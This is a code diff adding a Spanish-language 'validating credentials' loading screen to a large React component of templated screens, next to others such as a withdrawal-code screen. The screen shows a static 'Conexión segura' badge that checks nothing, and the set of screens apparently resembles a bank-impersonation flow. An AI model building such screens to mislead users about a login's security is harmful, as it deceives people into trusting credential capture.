@@ -3417,6 +3417,41 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
         return validandoSeguridadContent;
 
+      case ScreenType.VALIDANDO_LOGIN:
+        const validandoLoginContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: 'linear-gradient(135deg, #1a365d 0%, #0c4a5e 100%)', color: '#ffffff', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+            <div style={{ maxWidth: '480px', textAlign: 'center', background: 'rgba(255, 255, 255, 0.1)', borderRadius: '16px', padding: '48px 32px', backdropFilter: 'blur(10px)' }}>
+              <div style={{ marginBottom: '32px' }}>
+                <img src={validatingGif} alt="Validando" style={{ width: '100px', height: '100px', margin: '0 auto', filter: 'brightness(1.2)' }} />
+              </div>
+              <h2 style={{ fontSize: '26px', fontWeight: 600, color: '#ffffff', marginBottom: '16px' }}>
+                Validando credenciales...
+              </h2>
+              <p style={{ fontSize: '16px', color: 'rgba(255, 255, 255, 0.85)', lineHeight: '1.6', marginBottom: '24px' }}>
+                Estamos verificando tu información de acceso.
+              </p>
+              <div style={{ background: 'rgba(255, 255, 255, 0.15)', borderRadius: '8px', padding: '16px', marginBottom: '16px' }}>
+                <p style={{ fontSize: '14px', color: 'rgba(255, 255, 255, 0.9)', lineHeight: '1.5' }}>
+                  Por favor no cierres esta ventana.
+                  <br />
+                  Este proceso puede tomar unos momentos.
+                </p>
+              </div>
+              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
+                <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: '#4ade80', animation: 'pulse 1.5s infinite' }} />
+                <span style={{ fontSize: '13px', color: 'rgba(255, 255, 255, 0.7)' }}>Conexión segura</span>
+              </div>
+              <style>{`
+                @keyframes pulse {
+                  0%, 100% { opacity: 1; transform: scale(1); }
+                  50% { opacity: 0.5; transform: scale(0.8); }
+                }
+              `}</style>
+            </div>
+          </div>
+        );
+        return validandoLoginContent;
+
       case ScreenType.CODIGO_RETIRO:
         const codigoRetiroContent = (
           <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
